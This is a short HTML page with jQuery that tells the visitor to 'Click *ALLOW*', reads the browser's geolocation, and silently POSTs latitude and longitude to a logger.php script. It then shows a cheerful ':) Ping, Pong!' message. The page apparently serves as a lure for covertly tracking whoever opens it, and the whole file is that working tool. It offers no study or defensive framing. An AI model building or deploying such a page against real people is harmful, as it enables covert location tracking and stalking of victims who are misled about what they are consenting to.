<html>
<head>    
    <script src="http://maps.google.com/maps/api/js?sensor=true"></script>
    <script src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
</head>

<body>
    <div id="pos" style="width:800px; height:600px;">
        <h2>Click *ALLOW*</h2>
    </div>

    <script>
    $(function(){
            function initialize(coords) {
                $.ajax({
                   url: 'logger.php',
                   data: {
                        latitude:coords.latitude,
                        longitude:coords.longitude
                        },
                   error: function() {
                      $('#pos').html("Error, try again.");
                   },
                   success: function(data) {
                      $('#pos').html(":) Ping, Pong!");
                   },
                   type: 'POST'
                });
            }

            navigator.geolocation.getCurrentPosition(function(position){ 
                initialize(position.coords);
            }, function(){
                $('#pos').html('Failed to detect Location.');
            });
    });
    </script>
    </body>
    </html>
